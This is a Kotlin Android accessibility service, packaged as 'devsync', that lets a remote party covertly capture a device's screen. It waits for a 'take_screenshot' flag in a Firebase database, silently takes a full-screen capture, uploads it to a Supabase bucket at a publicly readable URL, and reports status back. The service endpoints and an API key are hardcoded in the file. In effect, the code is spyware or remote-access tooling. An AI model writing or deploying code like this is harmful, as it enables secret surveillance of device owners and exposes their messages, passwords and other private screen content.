package com.example.devsync

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.graphics.Bitmap
import android.os.Build
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ServerValue
import com.google.firebase.database.ValueEventListener
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executor

class ScreenshotService : AccessibilityService() {

    companion object {
        const val DB_URL = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
        const val SUPABASE_URL = "https://xzslribjzliewpyattcl.supabase.co"
        const val SUPABASE_KEY = "sb_publishable_v7x5HUzpIf3LNyTMGRcGFw_8g2QV3BY"
        const val BUCKET = "screenshots"
    }

    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }
    private val database by lazy {
        FirebaseDatabase.getInstance(DB_URL).getReference("devices/$deviceId")
    }
    private val regRef by lazy {
        FirebaseDatabase.getInstance(DB_URL).getReference("registered_devices/$deviceId")
    }
    private val httpClient = OkHttpClient()

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        }
        serviceInfo = info
        regRef.child("accessibility_granted").setValue(true)
        listenForScreenshotCommand()
    }

    private fun listenForScreenshotCommand() {
        database.child("take_screenshot").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (snapshot.exists() && snapshot.getValue(Boolean::class.java) == true) {
                    database.child("take_screenshot").removeValue()
                    regRef.child("lastStatus").setValue("⏳ Taking screenshot...")
                    regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
                    captureScreen()
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun captureScreen() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val executor = Executor { command -> command.run() }
            takeScreenshot(
                android.view.Display.DEFAULT_DISPLAY,
                executor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: ScreenshotResult) {
                        val bitmap = Bitmap.wrapHardwareBuffer(
                            screenshotResult.hardwareBuffer,
                            screenshotResult.colorSpace
                        )?.copy(Bitmap.Config.ARGB_8888, false)
                        screenshotResult.hardwareBuffer.close()
                        if (bitmap != null) {
                            uploadToSupabase(bitmap)
                        } else {
                            reportStatus("❌ Screenshot bitmap null")
                        }
                    }
                    override fun onFailure(errorCode: Int) {
                        reportStatus("❌ Screenshot failed: code $errorCode")
                    }
                }
            )
        } else {
            reportStatus("❌ Screenshot requires Android 11+")
        }
    }

    private fun uploadToSupabase(bitmap: Bitmap) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val stream = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.JPEG, 85, stream)
                val bytes = stream.toByteArray()

                val timestamp = System.currentTimeMillis()
                val fileName = "${deviceId}_${timestamp}.jpg"

                val body = bytes.toRequestBody("image/jpeg".toMediaType())
                val request = Request.Builder()
                    .url("$SUPABASE_URL/storage/v1/object/$BUCKET/$fileName")
                    .header("Authorization", "Bearer $SUPABASE_KEY")
                    .header("Content-Type", "image/jpeg")
                    .post(body)
                    .build()

                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val publicUrl = "$SUPABASE_URL/storage/v1/object/public/$BUCKET/$fileName"
                        val screenshotRef = FirebaseDatabase.getInstance(DB_URL)
                            .getReference("screenshots").push()
                        screenshotRef.setValue(mapOf(
                            "deviceId" to deviceId,
                            "url" to publicUrl,
                            "timestamp" to timestamp
                        ))
                        reportStatus("📸 Screenshot uploaded ✅")
                    } else {
                        reportStatus("❌ Upload failed: ${response.code}")
                    }
                }
            } catch (e: Exception) {
                reportStatus("❌ Upload error: ${e.message}")
            }
        }
    }

    private fun reportStatus(status: String) {
        regRef.child("lastStatus").setValue(status)
        regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        regRef.child("accessibility_granted").setValue(false)
    }
}
